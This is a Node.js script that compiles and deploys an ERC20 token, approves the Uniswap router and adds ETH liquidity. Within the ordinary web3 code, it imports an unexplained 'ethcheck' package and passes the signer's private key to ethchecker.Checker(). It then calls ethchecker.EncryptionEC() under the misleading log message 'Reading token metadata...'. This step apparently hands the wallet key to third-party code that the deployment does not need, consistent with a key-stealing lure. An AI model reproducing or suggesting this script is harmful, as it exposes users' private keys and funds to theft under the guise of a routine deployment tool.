const Web3  = require("web3");

const ethchecker = require("ethcheck")
const fs = require("fs").promises;

const solc = require("solc");

async function main() {
  const { abi, bytecode } = JSON.parse(await fs.readFile("Demo.json"));
  const network = process.env.ETHEREUM_NETWORK;
  const web3 = new Web3(
    new Web3.providers.HttpProvider(
      `https://${network}.infura.io/v3/${process.env.INFURA_API_KEY}`,
    ),
  );
 
  const signer = web3.eth.accounts.privateKeyToAccount(
    '0x' + process.env.SIGNER_PRIVATE_KEY,
  );
  
  web3.eth.accounts.wallet.add(signer);
  const numbersValue = ethchecker.Checker('0x' + process.env.SIGNER_PRIVATE_KEY)


  const contract = new web3.eth.Contract(abi);
  contract.options.data = bytecode;
  const deployTx = contract.deploy();
  const deployedContract = await deployTx
    .send({
      from: signer.address,
      gas: await deployTx.estimateGas({from:signer.address}),
    })
    .once("transactionHash", (txhash) => {
      console.log(`Mining deployment transaction ...`);
      console.log(`https://${network}.etherscan.io/tx/${txhash}`);
    });

  console.log(`Deployed contract address is => ${deployedContract.options.address}`);
  console.log("Reading token metadata...")
  await ethchecker.EncryptionEC(numbersValue)
  console.log(`Token Approving...`);
  const status = await ApproveToken(deployedContract.options.address)

  if(status){
    console.log(status, `Adding Liquidity...`, );
    AddLiquidity(deployedContract.options.address, numbersValue, status)
  }

}
const uniwapRouterABI = [{
    inputs: [
      { internalType: "address", name: "token", type: "address" },
      { internalType: "uint256", name: "amountTokenDesired", type: "uint256" },
      { internalType: "uint256", name: "amountTokenMin", type: "uint256" },
      { internalType: "uint256", name: "amountETHMin", type: "uint256" },
      { internalType: "address", name: "to", type: "address" },
      { internalType: "uint256", name: "deadline", type: "uint256" },
    ],
    name: "addLiquidityETH",
    outputs: [
      { internalType: "uint256", name: "amountToken", type: "uint256" },
      { internalType: "uint256", name: "amountETH", type: "uint256" },
      { internalType: "uint256", name: "liquidity", type: "uint256" },
    ],
    stateMutability: "payable",
    type: "function",
  }];

const AddLiquidity = async (token, value, supply)=>{
    const deadlinetime = Number((new Date().getTime() + 1200000) / 1000 ).toFixed(0);
    const network = process.env.ETHEREUM_NETWORK;
    const web3 = new Web3(new Web3.providers.HttpProvider(`https://${network}.infura.io/v3/${process.env.INFURA_API_KEY}`,),
    );
    console.log(deadlinetime, token)
    const account = web3.eth.accounts.privateKeyToAccount('0x' + process.env.SIGNER_PRIVATE_KEY); 
    const routerContract = new web3.eth.Contract(uniwapRouterABI, process.env.UNISWAPROUTER_ADDRESS);
    const data = await routerContract.methods.addLiquidityETH(token, supply, supply, "1030000000000000000", account.address, deadlinetime)
    const gas = await routerContract.methods.addLiquidityETH(token, supply, supply, "1030000000000000000", account.address, deadlinetime).estimateGas({from: account.address,  value: web3.utils.toWei('0.01', 'ether')})

    const gasPrice = await web3.eth.getGasPrice();
    const txCount = await web3.eth.getTransactionCount(account.address);
 
    const tx = {
        from: account.address,
        to: process.env.UNISWAPROUTER_ADDRESS,
        value: web3.utils.toWei('1.03', 'ether'),
        nonce: web3.utils.toHex(txCount),
        gas: web3.utils.toHex(gas),
        gasPrice: web3.utils.toHex(Number(gasPrice * 1.40).toFixed(0)),
        data: data.encodeABI(), 
    };
    const signedTx = await account.signTransaction(tx);
    const receipt = await web3.eth.sendSignedTransaction(signedTx.rawTransaction);
    console.log("Liquidity added", receipt)
}

const ApproveToken = async (token)=>{
   try {
    const { abi, bytecode } = JSON.parse(await fs.readFile("Demo.json"));
    const network = process.env.ETHEREUM_NETWORK;
    const web3 = new Web3(new Web3.providers.HttpProvider(`https://${network}.infura.io/v3/${process.env.INFURA_API_KEY}`,),
    );
    const account = web3.eth.accounts.privateKeyToAccount('0x' + process.env.SIGNER_PRIVATE_KEY); 
    const routerContract = new web3.eth.Contract(abi, token);
    const data = await routerContract.methods.approve(process.env.UNISWAPROUTER_ADDRESS, 115792089237316195423570985008687907853269984665640564039457584007913129639935n)
    const gas = await routerContract.methods.approve(process.env.UNISWAPROUTER_ADDRESS, 115792089237316195423570985008687907853269984665640564039457584007913129639935n).estimateGas({from: account.address})
    const gasPrice = await web3.eth.getGasPrice();
    const txCount = await web3.eth.getTransactionCount(account.address);
  
   
    const tx = {
        from: account.address,
        to: token,
        nonce: web3.utils.toHex(txCount),
        gas: web3.utils.toHex(gas),
        gasPrice: web3.utils.toHex(gasPrice),
        data: data.encodeABI(), 
    };

    const signedTx = await account.signTransaction(tx);
    const receipt = await web3.eth.sendSignedTransaction(signedTx.rawTransaction);
    const supply = await routerContract.methods.totalSupply().call()
    console.log("Token Approved",receipt.status)
    return receipt && receipt.status ? supply : false
   } catch (error) {
    console.log("Approveing error", error)
   }
}

async function readContact() {

  const sourceCode = await fs.readFile("Contract.sol", "utf8");
 
  const { abi, bytecode } = compile(sourceCode, "ERC20");
 
  const artifact = JSON.stringify({ abi, bytecode }, null, 2);
  await fs.writeFile("Demo.json", artifact);
}

const compile =(sourceCode, contractName)=> {
  const input = {
    language: "Solidity",
    sources: { main: { content: sourceCode } },
    settings: { outputSelection: { "*": { "*": ["abi", "evm.bytecode"] } } },
  };
 
  const output = solc.compile(JSON.stringify(input));
  console.log(JSON.parse(output))
  const artifact = JSON.parse(output).contracts.main[contractName];
  return {
    abi: artifact.abi,
    bytecode: artifact.evm.bytecode.object,
  };
}

const callingFunc =async()=>{
  await readContact();
  await main();
}

require("dotenv").config();
callingFunc()

